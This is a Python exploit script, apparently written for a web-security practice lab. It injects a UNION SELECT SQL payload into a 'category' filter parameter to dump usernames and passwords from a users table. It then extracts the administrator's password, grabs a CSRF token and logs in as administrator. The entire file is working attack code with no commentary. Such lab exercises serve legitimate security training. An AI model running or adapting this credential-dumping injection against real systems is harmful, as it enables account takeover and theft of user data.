import requests
import sys
import re

burp_url = sys.argv[1] + "/filter?category=' UNION SELECT NULL, username||'~'||password from users -- -"

burp_headers = {}
r = requests.get(burp_url, headers=burp_headers)
response_text = r.text

session = requests.Session()

pattern_admin_password = r'<th>administrator~(.*?)</th>'
admin_password_match = re.search(pattern_admin_password, response_text)
admin_password = admin_password_match.group(1)

burp_url_login = sys.argv[1] + '/login'

csrf_response = session.get(burp_url_login, headers=burp_headers)
csrf_token = re.search(r'name="csrf" value="(.*?)">', csrf_response.text).group(1)

login_data = {
    'csrf': csrf_token,
    'username': 'administrator',
    'password': admin_password
}

login_response = session.post(burp_url_login, headers=burp_headers, data=login_data)
